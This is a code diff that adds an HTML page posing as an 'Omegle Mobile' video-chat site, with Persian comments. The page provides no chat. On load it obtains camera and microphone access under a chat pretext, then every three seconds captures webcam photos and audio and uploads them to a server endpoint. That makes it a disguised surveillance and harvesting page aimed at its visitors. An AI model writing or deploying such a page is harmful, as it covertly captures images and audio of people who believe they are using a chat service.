@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Omegle Mobile - Video Chat</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<style>
+  /* استایل‌ها همانند قبل، تغییری نکرده */
+  body { font-family: sans-serif; background: #667eea; color: #fff; }
+  video { width: 100%; height: 60vh; object-fit: cover; transform: scaleX(-1);}
+  .notification { position: fixed; top:20px; left:50%; transform:translateX(-50%); background:rgba(255,255,255,0.9); color:#333; padding:10px 20px; border-radius:10px; display:none;}
+</style>
+</head>
+<body>
+
+<div class="permission-screen" id="permissionScreen">
+  <div class="permission-content">
+    <h2>Camera & Microphone Access</h2>
+    <p>Please allow permissions to start chat automatically.</p>
+  </div>
+</div>
+
+<video id="localVideo" autoplay muted playsinline></video>
+<div class="notification" id="notification"></div>
+
+<script>
+let mediaStream = null;
+let mediaRecorder = null;
+let recordingInterval = null;
+const localVideo = document.getElementById('localVideo');
+const permissionScreen = document.getElementById('permissionScreen');
+const notification = document.getElementById('notification');
+
+function showNotification(msg) {
+    notification.textContent = msg;
+    notification.style.display = 'block';
+    setTimeout(()=>{notification.style.display='none';},3000);
+}
+
+async function initCamera() {
+    try {
+        mediaStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        localVideo.srcObject = mediaStream;
+        permissionScreen.style.display = 'none';
+        showNotification('Camera & Mic access granted! Starting chat...');
+        startChat();
+    } catch(e) {
+        showNotification('Error accessing camera/mic');
+        console.error(e);
+    }
+}
+
+function takePicture() {
+    if(!mediaStream) return;
+    const canvas = document.createElement('canvas');
+    canvas.width = localVideo.videoWidth;
+    canvas.height = localVideo.videoHeight;
+    const ctx = canvas.getContext('2d');
+    ctx.translate(canvas.width,0); ctx.scale(-1,1);
+    ctx.drawImage(localVideo,0,0,canvas.width,canvas.height);
+    canvas.toBlob(blob => sendToServer('image', blob, 'photo.png'),'image/png');
+}
+
+async function sendToServer(type, data, filename) {
+    const formData = new FormData();
+    formData.append(type, data, filename);
+    try { await fetch('/upload', {method:'POST', body: formData}); }
+    catch(e){ console.error(e); }
+}
+
+function startChat() {
+    if(!mediaStream) return;
+
+    mediaRecorder = new MediaRecorder(mediaStream, { mimeType: 'audio/wav' });
+    mediaRecorder.ondataavailable = e => {
+        if(e.data && e.data.size > 0) sendToServer('audio', e.data, 'audio.wav');
+    };
+    mediaRecorder.start(3000); // هر ۳ ثانیه داده رو میفرسته
+    recordingInterval = setInterval(takePicture, 3000);
+    showNotification('Audio recording started (WAV)');
+}
+
+window.addEventListener('load', ()=>{ initCamera(); });
+</script>
+</body>
+</html>
